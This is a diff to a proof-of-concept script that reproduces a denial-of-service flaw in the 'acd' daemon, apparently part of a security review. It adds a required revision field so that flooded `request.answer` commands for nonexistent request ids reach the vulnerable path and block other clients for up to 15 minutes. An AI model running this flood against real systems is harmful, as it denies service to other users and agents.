@@ -21,6 +21,10 @@ control"): it also silently blocks every *other* paired client's and
 agent's `request.answer`/`ping` for up to 15 minutes, which is a new,
 cross-client denial of service, not just self-harm.
 
+acd/1 requires `revision` on `request.answer`; without it the daemon answers
+`bad_request` before it looks the request up. The requests here do not exist,
+so any valid revision reaches `RequestGone`; the scripts send revision 1.
+
 Usage:
     python3 -I idem_table_flood.py --dir <acd config dir> --port <ws port>
 
@@ -55,7 +59,8 @@ def main():
     victim.recv_json(timeout=5)
     victim.send_json({
         "id": "victim-0", "type": "request.answer",
-        "request_id": "victim-nonexistent-0", "option_id": "allow",
+        "request_id": "victim-nonexistent-0", "revision": 1,  # the request ids do not exist: any valid revision reaches RequestGone
+        "option_id": "allow",
     })
     r = victim.recv_json(timeout=5)
     print(f"  -> {r}")
@@ -76,6 +81,7 @@ def main():
             "id": cmd_id,
             "type": "request.answer",
             "request_id": f"nonexistent-{i}",
+            "revision": 1,  # the request ids do not exist: any valid revision reaches RequestGone
             "option_id": "allow",
         })
         reply = attacker.recv_json(timeout=5)
@@ -92,7 +98,8 @@ def main():
     fresh.recv_json(timeout=5)
     fresh.send_json({
         "id": "fresh-client-first-command", "type": "request.answer",
-        "request_id": "irrelevant", "option_id": "allow",
+        "request_id": "irrelevant", "revision": 1,  # the request ids do not exist: any valid revision reaches RequestGone
+        "option_id": "allow",
     })
     r = fresh.recv_json(timeout=5)
     print(f"  -> {r}")
